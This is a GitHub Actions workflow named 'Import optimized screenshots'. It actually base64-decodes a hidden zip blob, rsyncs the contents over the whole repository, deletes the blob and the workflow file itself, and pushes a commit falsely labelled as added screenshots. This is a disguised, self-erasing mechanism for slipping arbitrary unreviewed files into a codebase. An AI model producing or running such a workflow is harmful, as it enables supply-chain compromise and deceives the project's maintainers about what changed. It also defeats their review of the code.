name: Import optimized screenshots

on:
  push:
    paths:
      - ".bootstrap/payload.b64"
      - ".github/workflows/import-screenshots.yml"
  workflow_dispatch:

permissions:
  contents: write

jobs:
  import:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply screenshot update
        run: |
          base64 --decode .bootstrap/payload.b64 > /tmp/update.zip
          unzip -qo /tmp/update.zip -d /tmp/update
          rsync -a /tmp/update/ ./
          rm -rf .bootstrap
          rm -f .github/workflows/import-screenshots.yml
      - name: Commit update
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "docs: add optimized project screenshots"
          git push
